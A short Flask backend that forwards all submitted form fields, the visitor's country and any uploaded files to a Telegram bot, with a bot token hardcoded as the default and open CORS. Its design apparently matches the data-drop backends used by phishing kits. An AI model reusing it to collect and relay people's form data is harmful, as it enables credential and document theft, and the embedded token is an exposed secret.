from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA")

@app.route("/")
def home():
    return "✅ Backend running!"

@app.route("/submit", methods=["POST"])
def submit():
    # Detect JSON or multipart/form-data
    if request.is_json:
        data = request.get_json()
        bot_token = data.get("bot_token", BOT_TOKEN)
        chat_id = data.get("chat_id")
        form_data = data.get("form_data", {})
        page_title = data.get("pageTitle") or "No Title"
        country = data.get("country", "Unknown")  # ✅ added
    else:
        bot_token = request.form.get("bot_token", BOT_TOKEN)
        chat_id = request.form.get("chat_id")
        form_data = dict(request.form)
        page_title = request.form.get("pageTitle") or "No Title"
        country = request.form.get("country", "Unknown")  # ✅ added

    if not chat_id:
        return jsonify({"status": "error", "details": "chat_id is required"}), 400

    # Compose text message
    msg = f"📄 Page: {page_title}\n"
    msg += f"🌍 Country: {country}\n\n"  # ✅ added
    for k, v in form_data.items():
        if k not in ["bot_token", "chat_id", "pageTitle", "country"]:
            msg += f"{k}: {v}\n"

    # Send text message
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": msg})
    except Exception as e:
        return jsonify({"status": "error", "details": f"Text sending failed: {str(e)}"}), 500

    # Send all uploaded files (images, PDFs, docs, etc.)
    try:
        for key in request.files:
            file = request.files[key]
            files = {"document": (file.filename, file.stream, file.mimetype)}
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            requests.post(url, data={"chat_id": chat_id}, files=files)
    except Exception as e:
        return jsonify({"status": "error", "details": f"File sending failed: {str(e)}"}), 500

    return jsonify({"status": "ok"}), 200